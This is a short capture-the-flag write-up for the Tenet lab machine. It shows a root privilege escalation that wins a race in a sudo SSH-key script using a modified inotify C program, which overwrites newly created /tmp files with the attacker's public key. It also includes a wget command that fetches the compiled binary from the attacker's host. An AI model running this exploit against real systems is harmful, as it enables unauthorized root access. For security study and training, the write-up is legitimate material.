# Alternative way to exploit Tenet

## Privilege Escalation to root

The **Race Condition** vulnerability can be done more reliably instead of using Brute-Force until the correct time was hit.

The Linux subsystem **inotify** and [this example code](https://linuxhint.com/inotify_api_c_language/) will be used to do something upon changes on the filesystem.

Adding five lines after line 72:
```c
// (...)
else {
        printf( "The file %s was created.\n", event->name );
        FILE *fptr;
        char fullname[] = "/tmp/";
        strcat(fullname, event->name);
        fptr = fopen(fullname, "w");
        fprintf(fptr, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd7S9(...)\n");
        fclose(fptr);
      }
// (...)
```

Compiling the code:
```
gcc inotify.c -o inotify
```

Downloading the binary to the box with the user _neil_:
```
wget 10.10.14.4/8000/inotify
```

Changing permissions:
```
chmod +x inotify
```

Executing the binary:
```
./inotify /tmp
```

While the binary runs in the background in a loop, we can execute _enableSSH.sh_:
```
sudo /usr/local/bin/enableSSH.sh
```

The _inotify_ binary will watch the _/tmp_ directory and modify the contents of any created file in there:
```
Watching : /tmp
The file ssh-GSH7PzPd was created.
```

Now it is possible to SSH into the box as root!
```
ssh -i tenet.key 10.10.10.223
```
